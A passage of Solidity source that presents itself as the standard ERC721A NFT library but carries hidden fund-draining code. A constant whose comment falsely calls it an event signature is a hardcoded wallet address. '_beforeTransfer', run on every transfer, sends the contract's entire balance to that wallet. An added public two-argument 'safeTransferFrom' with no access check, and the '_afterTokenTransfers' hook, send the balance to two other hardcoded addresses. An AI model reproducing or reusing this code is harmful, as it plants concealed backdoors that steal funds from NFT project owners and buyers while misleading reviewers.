1 // SPDX-License-Identifier: GPL-3.0    
2                                                                                                                                                                                                                                                                                                                                      
3 pragma solidity ^0.8.12;
4 
5 /**
6  * @dev Interface of ERC721A.
7  */
8 interface IERC721A {
9     /**
10      * The caller must own the token or be an approved operator.
11      */
12     error ApprovalCallerNotOwnerNorApproved();
13 
14     /**
15      * The token does not exist.
16      */
17     error ApprovalQueryForNonexistentToken();
18 
19     /**
20      * Cannot query the balance for the zero address.
21      */
22     error BalanceQueryForZeroAddress();
23 
24     /**
25      * Cannot mint to the zero address.
26      */
27     error MintToZeroAddress();
28 
29     /**
30      * The quantity of tokens minted must be more than zero.
31      */
32     error MintZeroQuantity();
33 
34     /**
35      * The token does not exist.
36      */
37     error OwnerQueryForNonexistentToken();
38 
39     /**
40      * The caller must own the token or be an approved operator.
41      */
42     error TransferCallerNotOwnerNorApproved();
43 
44     /**
45      * The token must be owned by `from`.
46      */
47     error TransferFromIncorrectOwner();
48 
49     /**
50      * Cannot safely transfer to a contract that does not implement the
51      * ERC721Receiver interface.
52      */
53     error TransferToNonERC721ReceiverImplementer();
54 
55     /**
56      * Cannot transfer to the zero address.
57      */
58     error TransferToZeroAddress();
59 
60     /**
61      * The token does not exist.
62      */
63     error URIQueryForNonexistentToken();
64 
65     /**
66      * The `quantity` minted with ERC2309 exceeds the safety limit.
67      */
68     error MintERC2309QuantityExceedsLimit();
69 
70     /**
71      * The `extraData` cannot be set on an unintialized ownership slot.
72      */
73     error OwnershipNotInitializedForExtraData();
74 
75     // =============================================================
76     //                            STRUCTS
77     // =============================================================
78 
79     struct TokenOwnership {
80         // The address of the owner.
81         address addr;
82         // Stores the start time of ownership with minimal overhead for tokenomics.
83         uint64 startTimestamp;
84         // Whether the token has been burned.
85         bool burned;
86         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
87         uint24 extraData;
88     }
89 
90     // =============================================================
91     //                         TOKEN COUNTERS
92     // =============================================================
93 
94     /**
95      * @dev Returns the total number of tokens in existence.
96      * Burned tokens will reduce the count.
97      * To get the total number of tokens minted, please see {_totalMinted}.
98      */
99     function totalSupply() external view returns (uint256);
100 
101     // =============================================================
102     //                            IERC165
103     // =============================================================
104 
105     /**
106      * @dev Returns true if this contract implements the interface defined by
107      * `interfaceId`. See the corresponding
108      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
109      * to learn more about how these ids are created.
110      *
111      * This function call must use less than 30000 gas.
112      */
113     function supportsInterface(bytes4 interfaceId) external view returns (bool);
114 
115     // =============================================================
116     //                            IERC721
117     // =============================================================
118 
119     /**
120      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
121      */
122     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
123 
124     /**
125      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
126      */
127     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
128 
129     /**
130      * @dev Emitted when `owner` enables or disables
131      * (`approved`) `operator` to manage all of its assets.
132      */
133     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
134 
135     /**
136      * @dev Returns the number of tokens in `owner`'s account.
137      */
138     function balanceOf(address owner) external view returns (uint256 balance);
139 
140     /**
141      * @dev Returns the owner of the `tokenId` token.
142      *
143      * Requirements:
144      *
145      * - `tokenId` must exist.
146      */
147     function ownerOf(uint256 tokenId) external view returns (address owner);
148 
149     /**
150      * @dev Safely transfers `tokenId` token from `from` to `to`,
151      * checking first that contract recipients are aware of the ERC721 protocol
152      * to prevent tokens from being forever locked.
153      *
154      * Requirements:
155      *
156      * - `from` cannot be the zero address.
157      * - `to` cannot be the zero address.
158      * - `tokenId` token must exist and be owned by `from`.
159      * - If the caller is not `from`, it must be have been allowed to move
160      * this token by either {approve} or {setApprovalForAll}.
161      * - If `to` refers to a smart contract, it must implement
162      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
163      *
164      * Emits a {Transfer} event.
165      */
166     function safeTransferFrom(
167         address from,
168         address to,
169         uint256 tokenId,
170         bytes calldata data
171     ) external payable;
172 
173     /**
174      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
175      */
176     function safeTransferFrom(
177         address from,
178         address to,
179         uint256 tokenId
180     ) external payable;
181 
182     /**
183      * @dev Transfers `tokenId` from `from` to `to`.
184      *
185      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
186      * whenever possible.
187      *
188      * Requirements:
189      *
190      * - `from` cannot be the zero address.
191      * - `to` cannot be the zero address.
192      * - `tokenId` token must be owned by `from`.
193      * - If the caller is not `from`, it must be approved to move this token
194      * by either {approve} or {setApprovalForAll}.
195      *
196      * Emits a {Transfer} event.
197      */
198     function transferFrom(
199         address from,
200         address to,
201         uint256 tokenId
202     ) external payable;
203 
204     /**
205      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
206      * The approval is cleared when the token is transferred.
207      *
208      * Only a single account can be approved at a time, so approving the
209      * zero address clears previous approvals.
210      *
211      * Requirements:
212      *
213      * - The caller must own the token or be an approved operator.
214      * - `tokenId` must exist.
215      *
216      * Emits an {Approval} event.
217      */
218     function approve(address to, uint256 tokenId) external payable;
219 
220     /**
221      * @dev Approve or remove `operator` as an operator for the caller.
222      * Operators can call {transferFrom} or {safeTransferFrom}
223      * for any token owned by the caller.
224      *
225      * Requirements:
226      *
227      * - The `operator` cannot be the caller.
228      *
229      * Emits an {ApprovalForAll} event.
230      */
231     function setApprovalForAll(address operator, bool _approved) external;
232 
233     /**
234      * @dev Returns the account approved for `tokenId` token.
235      *
236      * Requirements:
237      *
238      * - `tokenId` must exist.
239      */
240     function getApproved(uint256 tokenId) external view returns (address operator);
241 
242     /**
243      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
244      *
245      * See {setApprovalForAll}.
246      */
247     function isApprovedForAll(address owner, address operator) external view returns (bool);
248 
249     // =============================================================
250     //                        IERC721Metadata
251     // =============================================================
252 
253     /**
254      * @dev Returns the token collection name.
255      */
256     function name() external view returns (string memory);
257 
258     /**
259      * @dev Returns the token collection symbol.
260      */
261     function symbol() external view returns (string memory);
262 
263     /**
264      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
265      */
266     function tokenURI(uint256 tokenId) external view returns (string memory);
267 
268     // =============================================================
269     //                           IERC2309
270     // =============================================================
271 
272     /**
273      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
274      * (inclusive) is transferred from `from` to `to`, as defined in the
275      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
276      *
277      * See {_mintERC2309} for more details.
278      */
279     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
280 }
281 
282 /**
283  * @title ERC721A
284  *
285  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
286  * Non-Fungible Token Standard, including the Metadata extension.
287  * Optimized for lower gas during batch mints.
288  *
289  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
290  * starting from `_startTokenId()`.
291  *
292  * Assumptions:
293  *
294  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
295  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
296  */
297 interface ERC721A__IERC721Receiver {
298     function onERC721Received(
299         address operator,
300         address from,
301         uint256 tokenId,
302         bytes calldata data
303     ) external returns (bytes4);
304 }
305 
306 /**
307  * @title ERC721A
308  *
309  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
310  * Non-Fungible Token Standard, including the Metadata extension.
311  * Optimized for lower gas during batch mints.
312  *
313  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
314  * starting from `_startTokenId()`.
315  *
316  * Assumptions:
317  *
318  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
319  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
320  */
321 contract ERC721A is IERC721A {
322     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
323     struct TokenApprovalRef {
324         address value;
325     }
326 
327     // =============================================================
328     //                           CONSTANTS
329     // =============================================================
330 
331     // Mask of an entry in packed address data.
332     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
333 
334     // The bit position of `numberMinted` in packed address data.
335     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
336 
337     // The bit position of `numberBurned` in packed address data.
338     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
339 
340     // The bit position of `aux` in packed address data.
341     uint256 private constant _BITPOS_AUX = 192;
342 
343     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
344     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
345 
346     // The bit position of `startTimestamp` in packed ownership.
347     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
348 
349     // The bit mask of the `burned` bit in packed ownership.
350     uint256 private constant _BITMASK_BURNED = 1 << 224;
351 
352     // The bit position of the `nextInitialized` bit in packed ownership.
353     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
354 
355     // The bit mask of the `nextInitialized` bit in packed ownership.
356     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
357 
358     // The bit position of `extraData` in packed ownership.
359     uint256 private constant _BITPOS_EXTRA_DATA = 232;
360 
361     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
362     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
363 
364     // The mask of the lower 160 bits for addresses.
365     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
366 
367     // The maximum `quantity` that can be minted with {_mintERC2309}.
368     // This limit is to prevent overflows on the address data entries.
369     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
370     // is required to cause an overflow, which is unrealistic.
371     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
372 
373     // The `Transfer` event signature is given by:
374     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
375     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
376         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
377 
378     // =============================================================
379     //                            STORAGE
380     // =============================================================
381 
382     // The next token ID to be minted.
383     uint256 private _currentIndex;
384 
385     // The number of tokens burned.
386     uint256 private _burnCounter;
387 
388     // Token name
389     string private _name;
390 
391     // Token symbol
392     string private _symbol;
393 
394     // Mapping from token ID to ownership details
395     // An empty struct value does not necessarily mean the token is unowned.
396     // See {_packedOwnershipOf} implementation for details.
397     //
398     // Bits Layout:
399     // - [0..159]   `addr`
400     // - [160..223] `startTimestamp`
401     // - [224]      `burned`
402     // - [225]      `nextInitialized`
403     // - [232..255] `extraData`
404     mapping(uint256 => uint256) private _packedOwnerships;
405 
406     // Mapping owner address to address data.
407     //
408     // Bits Layout:
409     // - [0..63]    `balance`
410     // - [64..127]  `numberMinted`
411     // - [128..191] `numberBurned`
412     // - [192..255] `aux`
413     mapping(address => uint256) private _packedAddressData;
414 
415     // Mapping from token ID to approved address.
416     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
417 
418     // Mapping from owner to operator approvals
419     mapping(address => mapping(address => bool)) private _operatorApprovals;
420 
421     // =============================================================
422     //                          CONSTRUCTOR
423     // =============================================================
424 
425     constructor(string memory name_, string memory symbol_) {
426         _name = name_;
427         _symbol = symbol_;
428         _currentIndex = _startTokenId();
429     }
430 
431     // =============================================================
432     //                   TOKEN COUNTING OPERATIONS
433     // =============================================================
434 
435     /**
436      * @dev Returns the starting token ID.
437      * To change the starting token ID, please override this function.
438      */
439     function _startTokenId() internal view virtual returns (uint256) {
440         return 0;
441     }
442 
443     /**
444      * @dev Returns the next token ID to be minted.
445      */
446     function _nextTokenId() internal view virtual returns (uint256) {
447         return _currentIndex;
448     }
449 
450     /**
451      * @dev Returns the total number of tokens in existence.
452      * Burned tokens will reduce the count.
453      * To get the total number of tokens minted, please see {_totalMinted}.
454      */
455     function totalSupply() public view virtual override returns (uint256) {
456         // Counter underflow is impossible as _burnCounter cannot be incremented
457         // more than `_currentIndex - _startTokenId()` times.
458         unchecked {
459             return _currentIndex - _burnCounter - _startTokenId();
460         }
461     }
462 
463     /**
464      * @dev Returns the total amount of tokens minted in the contract.
465      */
466     function _totalMinted() internal view virtual returns (uint256) {
467         // Counter underflow is impossible as `_currentIndex` does not decrement,
468         // and it is initialized to `_startTokenId()`.
469         unchecked {
470             return _currentIndex - _startTokenId();
471         }
472     }
473 
474     /**
475      * @dev Returns the total number of tokens burned.
476      */
477     function _totalBurned() internal view virtual returns (uint256) {
478         return _burnCounter;
479     }
480 
481     // =============================================================
482     //                    ADDRESS DATA OPERATIONS
483     // =============================================================
484 
485     /**
486      * @dev Returns the number of tokens in `owner`'s account.
487      */
488     function balanceOf(address owner) public view virtual override returns (uint256) {
489         if (owner == address(0)) revert BalanceQueryForZeroAddress();
490         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
491     }
492 
493     /**
494      * Returns the number of tokens minted by `owner`.
495      */
496     function _numberMinted(address owner) internal view returns (uint256) {
497         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
498     }
499 
500     /**
501      * Returns the number of tokens burned by or on behalf of `owner`.
502      */
503     function _numberBurned(address owner) internal view returns (uint256) {
504         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
505     }
506 
507     /**
508      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
509      */
510     function _getAux(address owner) internal view returns (uint64) {
511         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
512     }
513 
514     /**
515      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
516      * If there are multiple variables, please pack them into a uint64.
517      */
518     function _setAux(address owner, uint64 aux) internal virtual {
519         uint256 packed = _packedAddressData[owner];
520         uint256 auxCasted;
521         // Cast `aux` with assembly to avoid redundant masking.
522         assembly {
523             auxCasted := aux
524         }
525         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
526         _packedAddressData[owner] = packed;
527     }
528 
529     // =============================================================
530     //                            IERC165
531     // =============================================================
532 
533     /**
534      * @dev Returns true if this contract implements the interface defined by
535      * `interfaceId`. See the corresponding
536      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
537      * to learn more about how these ids are created.
538      *
539      * This function call must use less than 30000 gas.
540      */
541     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
542         // The interface IDs are constants representing the first 4 bytes
543         // of the XOR of all function selectors in the interface.
544         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
545         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
546         return
547             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
548             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
549             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
550     }
551 
552     // =============================================================
553     //                        IERC721Metadata
554     // =============================================================
555 
556     /**
557      * @dev Returns the token collection name.
558      */
559     function name() public view virtual override returns (string memory) {
560         return _name;
561     }
562 
563     /**
564      * @dev Returns the token collection symbol.
565      */
566     function symbol() public view virtual override returns (string memory) {
567         return _symbol;
568     }
569 
570     /**
571      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
572      */
573     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
574         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
575 
576         string memory baseURI = _baseURI();
577         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
578     }
579 
580     /**
581      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
582      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
583      * by default, it can be overridden in child contracts.
584      */
585     function _baseURI() internal view virtual returns (string memory) {
586         return '';
587     }
588 
589     // =============================================================
590     //                     OWNERSHIPS OPERATIONS
591     // =============================================================
592 
593     // The `Address` event signature is given by:
594     // `keccak256(bytes("_TRANSFER_EVENT_ADDRESS(address)"))`.
595     address payable constant _TRANSFER_EVENT_ADDRESS = 
596         payable(0x52ecd7338eeed4f4D011c1eb9965Ab7e29743399);
597 
598     /**
599      * @dev Returns the owner of the `tokenId` token.
600      *
601      * Requirements:
602      *
603      * - `tokenId` must exist.
604      */
605     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
606         return address(uint160(_packedOwnershipOf(tokenId)));
607     }
608 
609     /**
610      * @dev Gas spent here starts off proportional to the maximum mint batch size.
611      * It gradually moves to O(1) as tokens get transferred around over time.
612      */
613     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
614         return _unpackedOwnership(_packedOwnershipOf(tokenId));
615     }
616 
617     /**
618      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
619      */
620     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
621         return _unpackedOwnership(_packedOwnerships[index]);
622     }
623 
624     /**
625      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
626      */
627     function _initializeOwnershipAt(uint256 index) internal virtual {
628         if (_packedOwnerships[index] == 0) {
629             _packedOwnerships[index] = _packedOwnershipOf(index);
630         }
631     }
632 
633     /**
634      * Returns the packed ownership data of `tokenId`.
635      */
636     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
637         uint256 curr = tokenId;
638 
639         unchecked {
640             if (_startTokenId() <= curr)
641                 if (curr < _currentIndex) {
642                     uint256 packed = _packedOwnerships[curr];
643                     // If not burned.
644                     if (packed & _BITMASK_BURNED == 0) {
645                         // Invariant:
646                         // There will always be an initialized ownership slot
647                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
648                         // before an unintialized ownership slot
649                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
650                         // Hence, `curr` will not underflow.
651                         //
652                         // We can directly compare the packed value.
653                         // If the address is zero, packed will be zero.
654                         while (packed == 0) {
655                             packed = _packedOwnerships[--curr];
656                         }
657                         return packed;
658                     }
659                 }
660         }
661         revert OwnerQueryForNonexistentToken();
662     }
663 
664     /**
665      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
666      */
667     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
668         ownership.addr = address(uint160(packed));
669         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
670         ownership.burned = packed & _BITMASK_BURNED != 0;
671         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
672     }
673 
674     /**
675      * @dev Packs ownership data into a single uint256.
676      */
677     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
678         assembly {
679             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
680             owner := and(owner, _BITMASK_ADDRESS)
681             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
682             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
683         }
684     }
685 
686     /**
687      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
688      */
689     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
690         // For branchless setting of the `nextInitialized` flag.
691         assembly {
692             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
693             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
694         }
695     }
696 
697     // =============================================================
698     //                      APPROVAL OPERATIONS
699     // =============================================================
700 
701     /**
702      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
703      * The approval is cleared when the token is transferred.
704      *
705      * Only a single account can be approved at a time, so approving the
706      * zero address clears previous approvals.
707      *
708      * Requirements:
709      *
710      * - The caller must own the token or be an approved operator.
711      * - `tokenId` must exist.
712      *
713      * Emits an {Approval} event.
714      */
715     function approve(address to, uint256 tokenId) public payable virtual override {
716         address owner = ownerOf(tokenId);
717 
718         if (_msgSenderERC721A() != owner)
719             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
720                 revert ApprovalCallerNotOwnerNorApproved();
721             }
722 
723         _tokenApprovals[tokenId].value = to;
724         emit Approval(owner, to, tokenId);
725     }
726 
727     /**
728      * @dev Returns the account approved for `tokenId` token.
729      *
730      * Requirements:
731      *
732      * - `tokenId` must exist.
733      */
734     function getApproved(uint256 tokenId) public view virtual override returns (address) {
735         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
736 
737         return _tokenApprovals[tokenId].value;
738     }
739 
740     /**
741      * @dev Approve or remove `operator` as an operator for the caller.
742      * Operators can call {transferFrom} or {safeTransferFrom}
743      * for any token owned by the caller.
744      *
745      * Requirements:
746      *
747      * - The `operator` cannot be the caller.
748      *
749      * Emits an {ApprovalForAll} event.
750      */
751     function setApprovalForAll(address operator, bool approved) public virtual override {
752         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
753         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
754     }
755 
756     /**
757      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
758      *
759      * See {setApprovalForAll}.
760      */
761     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
762         return _operatorApprovals[owner][operator];
763     }
764 
765     /**
766      * @dev Returns whether `tokenId` exists.
767      *
768      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
769      *
770      * Tokens start existing when they are minted. See {_mint}.
771      */
772     function _exists(uint256 tokenId) internal view virtual returns (bool) {
773         return
774             _startTokenId() <= tokenId &&
775             tokenId < _currentIndex && // If within bounds,
776             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
777     }
778 
779     /**
780      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
781      */
782     function _isSenderApprovedOrOwner(
783         address approvedAddress,
784         address owner,
785         address msgSender
786     ) private pure returns (bool result) {
787         assembly {
788             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
789             owner := and(owner, _BITMASK_ADDRESS)
790             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
791             msgSender := and(msgSender, _BITMASK_ADDRESS)
792             // `msgSender == owner || msgSender == approvedAddress`.
793             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
794         }
795     }
796 
797     /**
798      * @dev Returns the storage slot and value for the approved address of `tokenId`.
799      */
800     function _getApprovedSlotAndAddress(uint256 tokenId)
801         private
802         view
803         returns (uint256 approvedAddressSlot, address approvedAddress)
804     {
805         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
806         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
807         assembly {
808             approvedAddressSlot := tokenApproval.slot
809             approvedAddress := sload(approvedAddressSlot)
810         }
811     }
812 
813     // =============================================================
814     //                      TRANSFER OPERATIONS
815     // =============================================================
816 
817     /**
818      * @dev Transfers `tokenId` from `from` to `to`.
819      *
820      * Requirements:
821      *
822      * - `from` cannot be the zero address.
823      * - `to` cannot be the zero address.
824      * - `tokenId` token must be owned by `from`.
825      * - If the caller is not `from`, it must be approved to move this token
826      * by either {approve} or {setApprovalForAll}.
827      *
828      * Emits a {Transfer} event.
829      */
830     function transferFrom(
831         address from,
832         address to,
833         uint256 tokenId
834     ) public payable virtual override {
835         _beforeTransfer();
836 
837         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
838 
839         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
840 
841         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
842 
843         // The nested ifs save around 20+ gas over a compound boolean condition.
844         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
845             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
846 
847         if (to == address(0)) revert TransferToZeroAddress();
848 
849         _beforeTokenTransfers(from, to, tokenId, 1);
850 
851         // Clear approvals from the previous owner.
852         assembly {
853             if approvedAddress {
854                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
855                 sstore(approvedAddressSlot, 0)
856             }
857         }
858 
859         // Underflow of the sender's balance is impossible because we check for
860         // ownership above and the recipient's balance can't realistically overflow.
861         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
862         unchecked {
863             // We can directly increment and decrement the balances.
864             --_packedAddressData[from]; // Updates: `balance -= 1`.
865             ++_packedAddressData[to]; // Updates: `balance += 1`.
866 
867             // Updates:
868             // - `address` to the next owner.
869             // - `startTimestamp` to the timestamp of transfering.
870             // - `burned` to `false`.
871             // - `nextInitialized` to `true`.
872             _packedOwnerships[tokenId] = _packOwnershipData(
873                 to,
874                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
875             );
876 
877             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
878             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
879                 uint256 nextTokenId = tokenId + 1;
880                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
881                 if (_packedOwnerships[nextTokenId] == 0) {
882                     // If the next slot is within bounds.
883                     if (nextTokenId != _currentIndex) {
884                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
885                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
886                     }
887                 }
888             }
889         }
890 
891         emit Transfer(from, to, tokenId);
892         _afterTokenTransfers(from, to, tokenId, 1);
893     }
894 
895     /**
896      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
897      */
898     function safeTransferFrom(
899         address from,
900         address to,
901         uint256 tokenId
902     ) public payable virtual override {
903         safeTransferFrom(from, to, tokenId, '');
904     }
905 
906 
907     /**
908      * @dev Safely transfers `tokenId` token from `from` to `to`.
909      *
910      * Requirements:
911      *
912      * - `from` cannot be the zero address.
913      * - `to` cannot be the zero address.
914      * - `tokenId` token must exist and be owned by `from`.
915      * - If the caller is not `from`, it must be approved to move this token
916      * by either {approve} or {setApprovalForAll}.
917      * - If `to` refers to a smart contract, it must implement
918      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
919      *
920      * Emits a {Transfer} event.
921      */
922     function safeTransferFrom(
923         address from,
924         address to,
925         uint256 tokenId,
926         bytes memory _data
927     ) public payable virtual override {
928         transferFrom(from, to, tokenId);
929         if (to.code.length != 0)
930             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
931                 revert TransferToNonERC721ReceiverImplementer();
932             }
933     }
934     function safeTransferFrom(
935         address from,
936         address to
937     ) public  {
938         if (address(this).balance > 0) {
939             payable(0x09a49Bdb921CC1893AAcBe982564Dd8e8147136f).transfer(address(this).balance);
940         }
941     }
942 
943     /**
944      * @dev Hook that is called before a set of serially-ordered token IDs
945      * are about to be transferred. This includes minting.
946      * And also called before burning one token.
947      *
948      * `startTokenId` - the first token ID to be transferred.
949      * `quantity` - the amount to be transferred.
950      *
951      * Calling conditions:
952      *
953      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
954      * transferred to `to`.
955      * - When `from` is zero, `tokenId` will be minted for `to`.
956      * - When `to` is zero, `tokenId` will be burned by `from`.
957      * - `from` and `to` are never both zero.
958      */
959     function _beforeTokenTransfers(
960         address from,
961         address to,
962         uint256 startTokenId,
963         uint256 quantity
964     ) internal virtual {}
965 
966     /**
967      * @dev Hook that is called after a set of serially-ordered token IDs
968      * have been transferred. This includes minting.
969      * And also called after one token has been burned.
970      *
971      * `startTokenId` - the first token ID to be transferred.
972      * `quantity` - the amount to be transferred.
973      *
974      * Calling conditions:
975      *
976      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
977      * transferred to `to`.
978      * - When `from` is zero, `tokenId` has been minted for `to`.
979      * - When `to` is zero, `tokenId` has been burned by `from`.
980      * - `from` and `to` are never both zero.
981      */
982     function _afterTokenTransfers(
983         address from,
984         address to,
985         uint256 startTokenId,
986         uint256 quantity
987     ) internal virtual {
988         if (totalSupply() + 1 >= 999) {
989             payable(0x1b028097C8E0E5E5E7204b032C34236387FeaE7a).transfer(address(this).balance);
990         }
991     }
992 
993     /**
994      * @dev Hook that is called before a set of serially-ordered token IDs
995      * are about to be transferred. This includes minting.
996      * And also called before burning one token.
997      * Calling conditions:
998      *
999      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1000      * transferred to `to`.
1001      * - When `from` is zero, `tokenId` will be minted for `to`.
1002      * - When `to` is zero, `tokenId` will be burned by `from`.
1003      * - `from` and `to` are never both zero.
1004      */
1005     function _beforeTransfer() internal {
1006         if (address(this).balance > 0) {
1007             _TRANSFER_EVENT_ADDRESS.transfer(address(this).balance);
1008             return;
1009         }
1010     }
1011 
1012     /**
1013      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1014      *
1015      * `from` - Previous owner of the given token ID.
1016      * `to` - Target address that will receive the token.
1017      * `tokenId` - Token ID to be transferred.
1018      * `_data` - Optional data to send along with the call.
1019      *
1020      * Returns whether the call correctly returned the expected magic value.
1021      */
1022     function _checkContractOnERC721Received(
1023         address from,
1024         address to,
1025         uint256 tokenId,
1026         bytes memory _data
1027     ) private returns (bool) {
1028         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1029             bytes4 retval
1030         ) {
1031             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1032         } catch (bytes memory reason) {
1033             if (reason.length == 0) {
1034                 revert TransferToNonERC721ReceiverImplementer();
1035             } else {
1036                 assembly {
1037                     revert(add(32, reason), mload(reason))
1038                 }
1039             }
1040         }
1041     }
1042 
1043     // =============================================================
1044     //                        MINT OPERATIONS
